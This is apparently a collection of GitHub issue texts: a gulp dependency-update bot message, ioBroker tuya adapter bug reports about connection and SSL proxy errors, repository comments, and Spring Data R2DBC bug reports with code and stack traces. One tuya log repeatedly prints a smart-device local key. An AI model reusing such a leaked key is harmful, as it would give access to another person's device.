<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/d3734d34288c63d9c80af4d2cb0457e0db5b9c51"><code>d3734d3</code></a> <code>Upgrade: Update glob-watcher, gulp-cli, and undertaker dependencies &amp; rimraf devDep</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/88437f2b71f13c44061f6af6b231adbc4a56842a"><code>88437f2</code></a> <code>Docs: Improve wording of file rename (#2314)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/53b9037a08807f0fb5a8837f3550f501af36f05d"><code>53b9037</code></a> <code>Docs: Add note about transpilation to "Splitting a Gulpfile" section (closes #2311) (#2312)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/f3f05486b872a85bc810492469d4b0e3d6da2fb4"><code>f3f0548</code></a> <code>Docs: Add Azure Pipelines badge (#2310)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/34a6d53e85cba8e00d75391fc15a50dca6f9d26a"><code>34a6d53</code></a> <code>Build: Fix Azure comment (#2307)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/b2c6c7e4c6cc85e6f7579b3c32081590d9517728"><code>b2c6c7e</code></a> <code>Build: Add Azure Pipelines CI (#2299)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/ed27cbeb576111641a72a9a89b8c3e1eb443172b"><code>ed27cbe</code></a> <code>Docs: Revert "next" reference now that 4.0 is latest</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/24e202b3a3dc9e1eecd3fc1e4b69e2b5379928ea"><code>24e202b</code></a> <code>Docs: Cleanup README for "latest" bump (#2268)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/75ea6344c2fcd5017fb74375aa81bca6f1e6b041"><code>75ea634</code></a> <code>Docs: Add "What's new in 4.0" section (closes #2089) (#2267)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/9078c4902358866f8240276ed55b0d58e8a2ecfe"><code>9078c49</code></a> <code>Scaffold: Add support-bot template</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/7239cf197ba69f4ae729da792013794faec6a90f"><code>7239cf1</code></a> <code>Docs: Update the babel dependencies to install &amp; configuration needed (closes #2136)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/c6413693a5957b609eeb23ecd7eebfa6fb2dcbe6"><code>c641369</code></a> <code>Docs: Fix broken link in Table of Contents (#2260)</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/9819957a11a1137f3b62bf7476ad26634c635975"><code>9819957</code></a> <code>Scaffold: Add new expense policy</code></li>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/c5af6f18f5532628e20a3c187db9a99a96043c05"><code>c5af6f1</code></a> <code>Docs: Remove front-matter from outdated pages</code></li>
</ul>
<p>There are 77 commits in total.</p>
<p>See the <a href="https://urls.greenkeeper.io/gulpjs/gulp/compare/55eb23a268dcc7340bb40808600fd4802848c06f...ea3bba4fdf9f2b508699f69569d0191b8c5bc10c">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 It seems that the adapter is not stopped correctly while updating through the admin-panel of iobroker.

host.iobroker | 2019-12-01 17:32:54.434 | warn | instance system.adapter.tuya.0 already running with pid 10224

After updating the adapter turns yellow or red in some cases, pausing and restarting the adapter it will turn green.

 this error has started to appear, the driver cannot connect to the device. What can be done in this case? App on phone is closed
log:
```
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468952306,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 Discovered device: 192.168.1.10:49154 -   U�           �    {"ip":"192.168.1.10","gwId":"30_CUT_e6","active":2,"ability":0,"mode":0,"encrypt":true,"productKey":"IAY_CUT_LmL","version":"3.1"}@V�  �U
 tuya.0 30_CUT_e6: Schema found for IAY_CUT_LmL: [object Object]
 tuya.0 30_CUT_e6: Create device objects if not exist
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468954255,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 stateChange tuya.0.30_CUT_e6.ip {"val":"192.168.1.10","ack":true,"ts":1554468954257,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":155_CUT_23}
tuya.0 30_CUT_e6 Init with IP=192.168.1.10, Key=09989b348ec0a361
 tuya.0 30_CUT_e6: Error from device (0): App still open on your mobile phone? Error: Error from socket
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468955308,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 Discovered device: 192.168.1.10:49154 -   U�           �    {"ip":"192.168.1.10","gwId":"30_CUT_e6","active":2,"ability":0,"mode":0,"encrypt":true,"productKey":"IAY_CUT_LmL","version":"3.1"}@V�  �U
 tuya.0 30_CUT_e6: Error from device (1): App still open on your mobile phone? Error: Error from socket
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468957312,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 30_CUT_e6: Error from device (2): App still open on your mobile phone? Error: Error from socket
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468959411,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 Discovered device: 192.168.1.10:49154 -   U�           �    {"ip":"192.168.1.10","gwId":"30_CUT_e6","active":2,"ability":0,"mode":0,"encrypt":true,"productKey":"IAY_CUT_LmL","version":"3.1"}@V�  �U
 tuya.0 30_CUT_e6: Error from device (3): App still open on your mobile phone? Error: Error from socket
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468961318,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 Discovered device: 192.168.1.10:49154 -   U�           �    {"ip":"192.168.1.10","gwId":"30_CUT_e6","active":2,"ability":0,"mode":0,"encrypt":true,"productKey":"IAY_CUT_LmL","version":"3.1"}@V�  �U
 tuya.0 30_CUT_e6: Schema found for IAY_CUT_LmL: [object Object]
 tuya.0 30_CUT_e6: Create device objects if not exist
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468963255,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 stateChange tuya.0.30_CUT_e6.ip {"val":"192.168.1.10","ack":true,"ts":1554468963257,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":155_CUT_23}
tuya.0 30_CUT_e6 Init with IP=192.168.1.10, Key=09989b348ec0a361
 tuya.0 30_CUT_e6: Error from device (0): App still open on your mobile phone? Error: Error from socket
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468964305,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 Discovered device: 192.168.1.10:49154 -   U�           �    {"ip":"192.168.1.10","gwId":"30_CUT_e6","active":2,"ability":0,"mode":0,"encrypt":true,"productKey":"IAY_CUT_LmL","version":"3.1"}@V�  �U
 tuya.0 30_CUT_e6: Error from device (1): App still open on your mobile phone? Error: Error from socket
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468966309,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 30_CUT_e6: Error from device (2): App still open on your mobile phone? Error: Error from socket
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468968413,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 Discovered device: 192.168.1.10:49154 -   U�           �    {"ip":"192.168.1.10","gwId":"30_CUT_e6","active":2,"ability":0,"mode":0,"encrypt":true,"productKey":"IAY_CUT_LmL","version":"3.1"}@V�  �U
 tuya.0 30_CUT_e6: Error from device (3): App still open on your mobile phone? Error: Error from socket
 tuya.0 30_CUT_e6: Disconnected from device
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468970312,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 Discovered device: 192.168.1.10:49154 -   U�           �    {"ip":"192.168.1.10","gwId":"30_CUT_e6","active":2,"ability":0,"mode":0,"encrypt":true,"productKey":"IAY_CUT_LmL","version":"3.1"}@V�  �U
 tuya.0 30_CUT_e6: Schema found for IAY_CUT_LmL: [object Object]
 tuya.0 30_CUT_e6: Create device objects if not exist
 tuya.0 stateChange tuya.0.30_CUT_e6.online {"val":false,"ack":true,"ts":1554468972255,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":15_CUT_9}
 tuya.0 stateChange tuya.0.30_CUT_e6.ip {"val":"192.168.1.10","ack":true,"ts":1554468972256,"q":0,"from":"system.adapter.tuya.0","user":"system.user.admin","lc":155_CUT_23}
tuya.0 30_CUT_e6 Init with IP=192.168.1.10, Key=09989b348ec0a361
``` Hi,,
i want to add new Devices to tuya but i always get an error:

![image](https://user-images.githubusercontent.com/37158961/71514608-bb916300-289f-11ea-8432-5d8a159b7062.png)


What i'm doing Wrong? 
Is there a problen in Software?

I use:

Node.js: v8.15.0 
NPM: 6.4.1
Typ: js-controller: 2.1.1
 Hallo,

ich habe heute bereits (über die Smart Life App) eine Steckdose erfolgreich in ioBroker hinzugefügt. Nun wollte ich die nächste Steckdose hinzufügen und in ioBroker importieren, doch leider funktioniert der Proxy jetzt nicht mehr korrekt.
Ich habe den tuya-Adapter 3.0.2 direkt hier von GitHub installiert, da es mit der 2.0.4 ebenfalls nicht ging.

Im ioBroker Fehlerlog werden folgende zwei Meldungen mehrmals geloggt, wenn eine Request von meinem Handy gesendet wird:

tuya.0 | 2019-10-01 22:12:18.049 | error | Error: 4144439296:error:14094416:SSL routines:ssl3_read_bytes:sslv3 alert certificate unknown:../deps/openssl/openssl/ssl/record/rec_layer_s3.c:1536:SSL alert number 46
-- | -- | -- | --
tuya.0 | 2019-10-01 22:12:18.049 | error | SSL-Proxy ERROR: Error: 4144439296:error:14094416:SSL routines:ssl3_read_bytes:sslv3 alert certificate unknown:../deps/openssl/openssl/ssl/record/rec_layer_s3.c:1536:SSL alert number 46

In der Smart Life App steht, wenn der Proxy aktiv ist, immer "Incorrect local timer 50502". Ohne Proxy funktioniert die App problemlos.
Eine korrekte Internetverbindung besteht ebenfalls, da ich mit Proxy normal im Intertet surfen kann.

Ich danke dir für deine tolle Arbeit an diesem Adapter und hoffe, dass wir den Fehler beheben können :)

Gruß,
Bluetexon Hi,
während der Proxy läuft und ich die Smart-Life-App starte erhalte ich folgende Fehle im Log:

Error: socket hang up at TLSSocket.onSocketClose (_tls_wrap.js:764:23) at TLSSocket.emit (events.js:203:15) at _handle.close (net.js:606:12) at Socket.done (_tls_wrap.js:388:7) at 

SSL-Proxy ERROR: Error: socket hang up

Die App meldet dabei "Das Netzwerk hat Verbindungsfehler Bitte überprüfen Sie das Netzwerk".
Zertifikat "NodeMITMProxyCA" ist installiert und Proxyeinstellungen (ioBroker-IP + Port 8888) in der WLAN-Verbindung sind gesetzt. Ich erhalte die Meldung sowohl auf ipad als auch iphone (jeweils v13.1.2)

Alles was ich dazu finden konnte ist, dass exakt dieses Problem mit Aufspielen von v.3.0.2 gelöst werden konnte und die meisten Android nutzen. Mehrfache Neuinstallation des Tuya-Adapters brachte keine Besserung. 

Node.js: v10.16.3
NPM: 6.9.0
Auf Raspberry Pi 3b+
<---------->
152492484
https://github.com/ifmeorg/ifme
@julianguyen Hey! I love that two of my articles are on this list. It would be even more amazing if they could link to the canonical articles on my own site (codingmindfully.com)

www.codingmindfully.com/stress 
www.codingmindfully.com/impostor

I can do a PR. https://github.com/ifmeorg/ifme
@julianguyen Hey! I love that two of my articles are on this list. It would be even more amazing if they could link to the canonical articles on my own site (codingmindfully.com)

www.codingmindfully.com/stress 
www.codingmindfully.com/impostor

I can do a PR. the only issue is tooooooo awesome this repo!!!
god bless software industry. the only issue is tooooooo awesome this repo!!!
god bless software industry.
<---------->
153427153
Currently it's very inconvenient to use insert fluent API with Kotlin nullable variables, because you can't use `GenericInsertSpec.value(...)` method. Nullable values should be allowed and just passed to `nullValue(...)` method.

You can workaround the problem with simple Kotlin extension function:
```
fun <T> DatabaseClient.GenericInsertSpec<T>.safeValue(field: String, value: Any?): DatabaseClient.GenericInsertSpec<T> =
    if (value == null) {
        this.nullValue(field)
    } else {
        this.value(field, value)
    }
``` I switched to using 0.8.0.RC1 of r2dbc-postgresql and started getting exception from Spring. Looks like the whole Netty Codec HTTP dependency got removed as a result. I switched to 0.8.0.RC1 because i need JSON support.

Relevant parts of my POM are below.

	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.2.0.RELEASE</version>
		<relativePath/>
	</parent>

	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-webflux</artifactId>
	</dependency>

        <dependency>
            <groupId>io.r2dbc</groupId>
            <artifactId>r2dbc-postgresql</artifactId>
            <version>0.8.0.RC1</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.data</groupId>
            <artifactId>spring-data-r2dbc</artifactId>
            <version>1.0.0.M1</version>
        </dependency>

Exception stack is blow.

Caused by: java.lang.BootstrapMethodError: java.lang.NoClassDefFoundError: io/netty/handler/codec/http/HttpHeaders
	at reactor.netty.http.client.HttpClient.<clinit>(HttpClient.java:963) ~[reactor-netty-0.9.0.RELEASE.jar:0.9.0.RELEASE]
	at org.springframework.http.client.reactive.ReactorClientHttpConnector.initHttpClient(ReactorClientHttpConnector.java:85) ~[spring-web-5.2.0.RELEASE.jar:5.2.0.RELEASE]
	at org.springframework.http.client.reactive.ReactorClientHttpConnector.<init>(ReactorClientHttpConnector.java:77) ~[spring-web-5.2.0.RELEASE.jar:5.2.0.RELEASE]
	at org.springframework.boot.autoconfigure.web.reactive.function.client.ClientHttpConnectorConfiguration$ReactorNetty.reactorClientHttpConnector(ClientHttpConnectorConfiguration.java:58) ~[spring-boot-autoconfigure-2.2.0.RELEASE.jar:2.2.0.RELEASE]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_111]
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_111]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_111]
	at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_111]
	at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ~[spring-beans-5.2.0.RELEASE.jar:5.2.0.RELEASE]
	... 20 common frames omitted
Caused by: java.lang.NoClassDefFoundError: io/netty/handler/codec/http/HttpHeaders
	... 29 common frames omitted
Caused by: java.lang.ClassNotFoundException: io.netty.handler.codec.http.HttpHeaders
	at java.net.URLClassLoader.findClass(URLClassLoader.java:381) ~[na:1.8.0_111]
	at java.lang.ClassLoader.loadClass(ClassLoader.java:424) ~[na:1.8.0_111]
	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331) ~[na:1.8.0_111]
	at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ~[na:1.8.0_111]
  We should add a Reactor checkpoint operator to help with debugging. I have a table defined as mentioned below

```sql
CREATE TABLE tablea (
	id serial primary key ,
	text_array text[],
	int_array int[]
) ;
```

Have a entity object defined as 

```java
@AllArgsConstructor
@NoArgsConstructor
@EntityScan
@Getter @Setter 
@Table("tablea")
public class Tablea {
    @Id
    private Long id;
    private List<String> textArray;
    private List<Integer> intArray = Arrays.asList(1,2,3);
```

When i insert the data both the arrays are inserted as null. If i manually insert them and try to retrieve it is working fine r2dbc-mssql 0.8.0.RC2
spring-boot-starter-data-r2dbc: 0.1.0.M2

Expected 1, 2, 3, ...
Actual: 2, 4, 6, ...
...
    @Autowired
    private lateinit var databaseClient: DatabaseClient

    @Test
    @Order(1)
    fun `give TestSeq RESTART WITH 1 when SELECT CAST(NEXT VALUE FOR TestSeq AS BIGINT) then 1 returned`() {

        /*
        -- DROP SEQUENCE TestSeq
        -- CREATE SEQUENCE TestSeq START WITH 1 INCREMENT BY 1
         */

        databaseClient
                .execute("ALTER SEQUENCE TestSeq RESTART WITH 1")
                .fetch().first().block()

        databaseClient
                .execute("SELECT CAST(NEXT VALUE FOR TestSeq AS BIGINT)")

                .`as`(java.lang.Long::class.java).fetch()

                .first().block() `should equal` 1.toLong()

    }
... Inserting a row through `R2dbcRepository.save(…)` with a provided Id completes without emitting the saved object. This is because we assume key generation but in such case, no key generation happens. It should be configured with `readOnly=true` by default and `readOnly=false` for writing methods (save* and delete*).  It would be nice if Spring Data R2DBC has hooks like `@PostLoad`, `@PrePersist`, `@PreUpdate` in JPA so that some computation for transient props could take place. Meanwhile there was 1.0.0.M4, 1.0.0.M5, 1.0.0.M6, 1.0.0.M7. It looks like an upgrade to 1.0.0.M7 could make sense. We should add support for MySQL (dialect and tests) and use the https://github.com/jasync-sql/jasync-sql/ driver that wraps their asynchronous driver with an R2DBC facade. I use spring boot, postgress and r2dbc.
I try to do a basic query to get user

Used recent version of libs

> implementation 'io.r2dbc:r2dbc-postgresql:1.0.0.M7'
>     compile 'io.r2dbc:r2dbc-pool:1.0.0.BUILD-SNAPSHOT'
>     implementation 'org.springframework.boot.experimental:spring-boot-starter-r2dbc:0.1.0.M1'
>     implementation 'org.springframework.boot.experimental:spring-boot-starter-data-r2dbc:0.1.0.BUILD-SNAPSHOT'

	
Code

        public interface UserRepository extends ReactiveCrudRepository<User, Integer> {
		@Query("SELECT * FROM user WHERE username = :username")
		public Mono<User> findByUsername(String username);
	}
	

	@Table
	public class User{

		@Id
		private Integer id;

		private String username;
		private String password;

		private boolean enabled;

		private String role;
		...
	}
	
	
	EnableDiscoveryClient
	@SpringBootApplication
	//@EnableR2dbcRepositories enable get same error
	public class GatewayServiceApplication {
		...
	}
	
	@Component
	public class ApplicationRunner implements CommandLineRunner{

                 @Autowired
                 private DatabaseClient client;

		@Autowired
		private UserRepository repository;

		@Override
		public void run(String... args) throws Exception {
			repository.findAll().subscribe(user-> System.out.println(user.getId() + " " + user.getUsername() + " " + user.getRole()));
		}

	}
	
	@Configuration
	@EnableR2dbcRepositories
	public class DatabaseConfig extends AbstractR2dbcConfiguration {

		@Override
		public ConnectionFactory connectionFactory() {
			return new PostgresqlConnectionFactory(
					PostgresqlConnectionConfiguration.builder()
							.host("localhost")
							.port(5432)
							.database("mermacon")
							.schema("lcn")
							.username("test")
							.password("test").build()
			);
		}
	}

	
When application start, I get
	
	

>  i.r.p.client.ReactorNettyClient          : Error: SEVERITY_LOCALIZED=ERROR, SEVERITY_NON_LOCALIZED=ERROR, CODE=42601, MESSAGE=syntax error at or near ".", POSITION=12, FILE=scan.l, LINE=1128, ROUTINE=scanner_yyerror

	 
	 If findByUsername method is called, i get
	

> i.r.p.client.ReactorNettyClient          : Error: SEVERITY_LOCALIZED=ERROR, SEVERITY_NON_LOCALIZED=ERROR, CODE=42703, MESSAGE=column "username" does not exist, POSITION=26, FILE=parse_relation.c, LINE=3194, ROUTINE=errorMissingColumn

In the ApplicationRunner class, if i add

 ```
client.execute("select * from lcm.user").fetch().all().subscribe(
                user-> System.out.println(user.keySet())
        );
```

I see columns of user table

[id, username, password, role]

So issue seem repository


 Some relational databases (MySQL) don't have a built in boolean type, so the convention is just to use a `tinyint` instead. However, if one tries to then map a boolean to this value (via a `ReactiveCrudRepository` or similar), then this error will occur:

    org.springframework.core.convert.ConverterNotFoundException: No converter found capable of converting from type [java.lang.Byte] to type [java.lang.Boolean]

It's reasonably easy to fix by providing a custom conversion like so:

    @EnableR2dbcRepositories
    @Configuration
    class MySqlR2dbConfiguration extends AbstractR2dbcConfiguration {

        @Override
        @Bean
        public R2dbcCustomConversions r2dbcCustomConversions() {
            return new R2dbcCustomConversions(List.of(new Converter<Byte, Boolean>() {
 
                @Override
                public Boolean convert(Byte s) {
                    if (s == null) {
                        return null;
                    }
                    return s != 0;
                }

            }));
        }

        @Override
        public ConnectionFactory connectionFactory() {
            //...etc...
        }
    }

...but it certainly feels like some boilerplate that an application developer shouldn't be expected to provide. Would it be possible to bundle a similar converter by default?  Right now, we're using Spring Framework's JDBC module to apply exception translation. Spring JDBC is heavily based on JDBC API and it makes little sense to pull JDBC API into R2DBC, especially when running in modularized Java 9+ environments.

We should provide our own exception translation mechanism that is built along the lines of Spring JDBC's `SQLErrorCodes` without using JDBC API. Postgres function:
```
create or replace function find(data_like text, offs bigint, size int) returns refcursor as
$$
DECLARE
    xxx refcursor;
BEGIN
    PERFORM pg_sleep(3);
    open xxx for select td.id, td.data from test_data td where td.data like '%' || data_like || '%' limit size offset offs;
    return xxx;
end;
$$ language plpgsql;
```
Version: 1.0.0.M2
Database client call:
```
override fun findTestData(page: Int, size: Int, data_like: String): Flux<TestData> {
        return databaseClient.execute()
            .sql("select public.find(:data_like, :offset, :size)")
            .bind("data_like", data_like)
            .bind("offset", page*size)
            .bind("size", size)
            .asType<TestData>()
            .fetch()
            .all()
    }
```
Error:
```
org.springframework.data.mapping.MappingException: Couldn't read column data from Row.
	at org.springframework.data.r2dbc.convert.MappingR2dbcConverter$RowParameterValueProvider.getParameterValue(MappingR2dbcConverter.java:434) ~[spring-data-r2dbc-1.0.0.M2.jar:1.0.0.M2]
	at org.springframework.data.relational.core.conversion.BasicRelationalConverter$ConvertingParameterValueProvider.getParameterValue(BasicRelationalConverter.java:256) ~[spring-data-relational-1.1.0.M4.jar:1.1.0.M4]
	at org.springframework.data.convert.KotlinClassGeneratingEntityInstantiator$DefaultingKotlinClassInstantiatorAdapter.extractInvocationArguments(KotlinClassGeneratingEntityInstantiator.java:230) ~[spring-data-commons-2.2.0.M4.jar:2.2.0.M4]
	at org.springframework.data.convert.KotlinClassGeneratingEntityInstantiator$DefaultingKotlinClassInstantiatorAdapter.createInstance(KotlinClassGeneratingEntityInstantiator.java:204) ~[spring-data-commons-2.2.0.M4.jar:2.2.0.M4]
	at org.springframework.data.convert.ClassGeneratingEntityInstantiator.createInstance(ClassGeneratingEntityInstantiator.java:84) ~[spring-data-commons-2.2.0.M4.jar:2.2.0.M4]
	at org.springframework.data.relational.core.conversion.BasicRelationalConverter.createInstance(BasicRelationalConverter.java:146) ~[spring-data-relational-1.1.0.M4.jar:1.1.0.M4]
	at org.springframework.data.r2dbc.convert.MappingR2dbcConverter.createInstance(MappingR2dbcConverter.java:209) ~[spring-data-r2dbc-1.0.0.M2.jar:1.0.0.M2]
	at org.springframework.data.r2dbc.convert.MappingR2dbcConverter.read(MappingR2dbcConverter.java:107) ~[spring-data-r2dbc-1.0.0.M2.jar:1.0.0.M2]
	at org.springframework.data.r2dbc.convert.MappingR2dbcConverter.read(MappingR2dbcConverter.java:102) ~[spring-data-r2dbc-1.0.0.M2.jar:1.0.0.M2]
	at org.springframework.data.r2dbc.convert.MappingR2dbcConverter.read(MappingR2dbcConverter.java:60) ~[spring-data-r2dbc-1.0.0.M2.jar:1.0.0.M2]
	at org.springframework.data.r2dbc.convert.EntityRowMapper.apply(EntityRowMapper.java:46) ~[spring-data-r2dbc-1.0.0.M2.jar:1.0.0.M2]
	at org.springframework.data.r2dbc.convert.EntityRowMapper.apply(EntityRowMapper.java:29) ~[spring-data-r2dbc-1.0.0.M2.jar:1.0.0.M2]
	at io.r2dbc.postgresql.PostgresqlResult.lambda$map$0(PostgresqlResult.java:69) ~[r2dbc-postgresql-1.0.0.M7.jar:na]
	at reactor.function.TupleUtils.lambda$function$7(TupleUtils.java:143) ~[reactor-extra-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxMap$MapSubscriber.onNext(FluxMap.java:100) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxZip$ZipCoordinator.drain(FluxZip.java:735) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxZip$ZipInner.onNext(FluxZip.java:894) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxRepeatPredicate$RepeatPredicateSubscriber.onNext(FluxRepeatPredicate.java:78) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxMap$MapSubscriber.onNext(FluxMap.java:114) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1570) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.MonoProcessor.onNext(MonoProcessor.java:316) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1570) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.MonoSingle$SingleSubscriber.onComplete(MonoSingle.java:171) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxMapFuseable$MapFuseableSubscriber.onComplete(FluxMapFuseable.java:144) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxFilterFuseable$FilterFuseableSubscriber.onComplete(FluxFilterFuseable.java:166) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxReplay$UnboundedReplayBuffer.replayNormal(FluxReplay.java:550) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxReplay$UnboundedReplayBuffer.replay(FluxReplay.java:653) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxReplay$ReplaySubscriber.onComplete(FluxReplay.java:1188) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxTake$TakeSubscriber.onComplete(FluxTake.java:147) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxTake$TakeSubscriber.onNext(FluxTake.java:127) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.EmitterProcessor.drain(EmitterProcessor.java:422) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.EmitterProcessor.onNext(EmitterProcessor.java:264) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxHide$HideSubscriber.onNext(FluxHide.java:74) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxHandleFuseable$HandleFuseableSubscriber.onNext(FluxHandleFuseable.java:180) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxWindowPredicate$WindowFlux.drainRegular(FluxWindowPredicate.java:636) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxWindowPredicate$WindowFlux.drain(FluxWindowPredicate.java:714) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxWindowPredicate$WindowFlux.onNext(FluxWindowPredicate.java:756) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxWindowPredicate$WindowPredicateMain.onNext(FluxWindowPredicate.java:248) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.MonoFlatMapMany$FlatMapManyInner.onNext(MonoFlatMapMany.java:238) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.MonoFlatMapMany$FlatMapManyInner.onNext(MonoFlatMapMany.java:238) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxWindowPredicate$WindowFlux.drainRegular(FluxWindowPredicate.java:636) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxWindowPredicate$WindowFlux.drain(FluxWindowPredicate.java:714) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxWindowPredicate$WindowFlux.onNext(FluxWindowPredicate.java:756) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxWindowPredicate$WindowPredicateMain.onNext(FluxWindowPredicate.java:248) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxHandle$HandleSubscriber.onNext(FluxHandle.java:113) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxHandle$HandleConditionalSubscriber.onNext(FluxHandle.java:320) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxHandle$HandleConditionalSubscriber.onNext(FluxHandle.java:320) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
